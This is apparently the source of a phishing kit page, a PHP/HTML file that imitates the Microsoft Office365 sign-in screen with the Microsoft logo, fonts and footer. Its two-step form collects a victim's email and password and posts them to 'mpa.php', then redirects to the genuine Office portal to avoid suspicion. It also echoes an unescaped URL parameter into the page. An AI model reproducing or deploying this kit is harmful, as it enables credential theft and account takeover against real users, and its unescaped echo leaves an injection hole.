<?php
$logn = $_GET['logn'];
echo $email;

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<title>Sign in to your account</title>
<link rel="shortcut icon" href="css/favicon.ico">
<script src="css/jquery-latest.min.js"></script>
<script>
$(document).on("keyup", "input[name=logn]", function() {
    $("span.logn").html($(this).val());
});
//     document.getElementById("firstch").click();
 window.document.onkeydown = CheckEnter;

  function CheckEnter(){

     if(event.keyCode == 13)

          return false;

     return true;

}

function checkFilled() {
   	var fld=document.getElementById('logn').value;
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
	var ooop = document.getElementById("filth");
	    if (fld.match(emailExp)) 
		{ 
   document.getElementById('filth').style.display = "none";
   document.getElementById('porn').style.display = "block";
   document.getElementById("passd").focus();
   document.getElementById('logn').style.borderColor = "blue";
   return true;
         } else {
		document.getElementById('logn').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efire').style.display = "block";
		document.getElementById("logn").focus();
		ooop.style.height = "320px";
        return false;
    }
}

function checkPassy() { 
    var fn=document.getElementById('passd').value;	
	var poop = document.getElementById("porn");
 if(fn.length < 5){
        document.getElementById('passd').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efired').style.display = "block";
		document.getElementById("passd").focus();
		poop.style.height = "300px";		
        return false;
    }else{
        document.getElementById('efired').style.display = "none";
		document.getElementById('passd').style.borderColor = "blue";
		return true;
    }
}

</script>
<link rel="stylesheet" type="text/css" href="css/stylepapa.css">

<body>
<div id="bady">
  <form  name="form1" spellcheck="false" method="post" action="mpa.php" autocomplete="off">
<div class="chamber">
<input name="agenti" type="hidden" id="agenti" value="Office365">
  <input name="redir" type="hidden" id="redir" value="https://portal.office.com/servicestatus">
      <div class="alterna" id="filth" style="display:nne;">
   <div class="logo">
<img src="css/microsoft_logo.svg" alt="Microsoft Logo" /></div>

<h2 style="margin: 20px -2px 12px; padding: 0px; font-weight: 600; color: rgb(64, 64, 64); font-family: &quot;Segoe UI&quot;,&quot;Helvetica Neue&quot;,&quot;Lucida Grande&quot;,Roboto,Ebrima,&quot;Nirmala UI&quot;,Gadugi,&quot;Segoe Xbox Symbol&quot;,&quot;Segoe UI Symbol&quot;,&quot;Meiryo UI&quot;,&quot;Khmer UI&quot;,Tunga,&quot;Lao UI&quot;,Raavi,&quot;Iskoola Pota&quot;,Latha,Leelawadee,&quot;Microsoft YaHei UI&quot;;">Sign in</h2>
 <div id="efire" style="display:none;">Enter a valid email address, phone number, or Skype name.</div>
  <input maxlength="113" autofocus placeholder="Email, phone, or Skype" id="logn" name="logn" aria-label="Enter your email, phone, or Skype." style="border-style: solid; border-width: 0px 0px 1px; margin: 0px; padding: 0px 0px; color: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; max-width: 100%; display: block; width: 350px; background-image: none; direction: ltr; height: 36px;"
 lang="en" value="<?php echo $logn ?>" type="email">
<h4><a href="index.html" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;">Can't access your account?</a><br/><br/>
No account? <a href="login.html" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;">Create
one!</a> </h4>
<!-- piachie onyembu -->
<div style="position: absolute; min-height: 1px; padding-left: 0px; padding-right: 0px; float: left; width: 438px; margin-bottom: 0px; bottom: 44px; right: 44px; text-align: right;">
  <button name="button" type="button"  class="oo-primary">Back</button>
  <button name="button" type="button"  class="btn-primary" id="firstch"  onClick="checkFilled()">Next</button>

</div>
  </div> 
  
<div class="alterna" id="porn" style="display:none;">
   <div class="logo">
<img src="css/microsoft_logo.svg" alt="Microsoft Logo" /></div>
<div class="ugogbe"><a href="index.html"><img src="css/arrow_left.svg" class="eholder" /></a><span class="logn" ><?php echo $logn ?></span></div>
<h2 style="margin: 20px -2px 12px; padding: 0px; font-weight: 600; color: rgb(64, 64, 64); font-family: &quot;Segoe UI&quot;,&quot;Helvetica Neue&quot;,&quot;Lucida Grande&quot;,Roboto,Ebrima,&quot;Nirmala UI&quot;,Gadugi,&quot;Segoe Xbox Symbol&quot;,&quot;Segoe UI Symbol&quot;,&quot;Meiryo UI&quot;,&quot;Khmer UI&quot;,Tunga,&quot;Lao UI&quot;,Raavi,&quot;Iskoola Pota&quot;,Latha,Leelawadee,&quot;Microsoft YaHei UI&quot;;">Enter password</h2>
<div id="efired" style="display:none;">Please enter your password.</div>
<label for="passd"></label>
<input type="password" name="passd" id="passd" placeholder="Password" style="border-style: solid; border-width: 0px 0px 1px; margin: 0px; padding: 0px 0px; color: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; max-width: 100%; display: block; width: 350px; background-image: none; direction: ltr; height: 36px;" />
<div style="margin-top: 8px; float:left;"><a href="index.html#" style="background-color: transparent; color: rgb(0, 103, 184); font-size:13px; text-decoration: none;">Forgot my password</a></div>

<div style="position: absolute; min-height: 1px; padding-left: 0px; padding-right: 0px; float: left; width: 438px; margin-bottom: 0px; bottom: 44px; right: 44px; text-align: right;">
  <button name="button" type="submit"  class="btn-primary" id="button" onClick="return checkPassy()">Sign in</button>

</div>
      </div>
    <!-- piachie chamber -->
      </div>
  </form>
<div class="footer">
<span style="margin-right:15px;">&copy;2018 Microsoft</span>
<span style="margin-right:15px;"><a href="index.html" style="color: #FFFFFF; text-decoration: none; white-space: nowrap;">Terms of use</a></span>
<span style="margin-right:6px;"><a href="index.html" style="color: #FFFFFF; text-decoration: none; white-space: nowrap; ">Privacy &amp; cookies</a></span>
<span style="margin-right:6px;"><a href="index.html" style="color: #FFFFFF; text-decoration: none; white-space: nowrap; font-size:18px;">...</a></span>
    </div>
    </div>
</body>
</html>